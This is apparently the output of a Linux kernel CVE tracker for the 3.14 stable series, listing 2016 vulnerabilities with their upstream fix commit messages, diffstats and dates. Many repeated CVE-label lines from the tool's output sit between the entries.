      NIP: c000000000043e80 LR: c000000000015a24 CTR: 0000000000000000
      REGS: c00000003ffef7e0 TRAP: 0700   Tainted: G      D
      MSR: 8000000300201033 <SF,ME,IR,DR,RI,LE,TM[SE]>  CR: 28002828  XER: 00000000
      CFAR: c000000000015a20 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 c00000003ffefa60 c000000000db5500 c0000000fbead000
      GPR04: 8000000300001033 2222222222222222 2222222222222222 00000000ff160000
      GPR08: 0000000000000000 800000010000d033 c0000000fb7e3ea0 c00000000fe00004
      GPR12: 0000000000002200 c00000000fe00000 0000000000000000 0000000000000000
      GPR16: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR20: 0000000000000000 0000000000000000 c0000000fbea7410 00000000ff160000
      GPR24: c0000000ffe1f600 c0000000fbea8700 c0000000fbea8700 c0000000fbead000
      GPR28: c000000000e20198 c0000000fbea6d80 c0000000fbeab680 c0000000fbea6d80
      NIP [c000000000043e80] tm_restore_sprs+0xc/0x1c
      LR [c000000000015a24] __switch_to+0x1f4/0x420
      Call Trace:
      Instruction dump:
      7c800164 4e800020 7c0022a6 f80304a8 7c0222a6 f80304b0 7c0122a6 f80304b8
      4e800020 e80304a8 7c0023a6 e80304b0 <7c0223a6> e80304b8 7c0123a6 4e800020
    
    This fixes CVE-2016-5828.
    
    Fixes: bc2a9408fa65 ("powerpc: Hook in new transactional memory code")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Cyril Bur <cyrilbur@gmail.com>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/kernel/process.c |   10 ++++++++++
 1 file changed, 10 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5828
Break Date: 2013-02-15
Break Commit: bc2a9408fa65195288b41751016c36fd00a75a85
Break Tag: 3.9
Linus Fix Date: 2016-06-27
Linus Commit: 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: ff19f63ed47309550b47831ac39176d9910fadfe
Stable Tag: 3.14.74

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
